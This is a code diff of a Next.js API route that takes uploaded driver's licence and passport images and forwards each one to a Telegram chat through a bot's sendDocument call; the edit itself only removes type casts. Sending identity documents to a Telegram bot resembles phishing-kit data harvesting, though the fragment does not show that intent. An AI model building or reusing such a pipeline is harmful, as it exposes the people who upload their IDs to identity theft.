@@ -16,8 +16,8 @@ export async function POST(req: NextRequest) {
       const fileKeys = ["driversLicenseFront", "driversLicenseBack", "passport"];
       for (const key of fileKeys) {
         const file = form.get(key) as File | null;
-        if (file && (file as any).size) {
-          const filename = (file as any).name || key;
+        if (file && file.size) {
+          const filename = file.name || key;
           files.push({ name: filename, blob: file });
         }
       }
@@ -51,7 +51,7 @@ export async function POST(req: NextRequest) {
       const fd = new FormData();
       fd.append("chat_id", telegramChatId);
       // append file blob with filename so Telegram accepts it
-      fd.append("document", f.blob as any, f.name);
+      fd.append("document", f.blob, f.name);
 
       await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
         method: "POST",
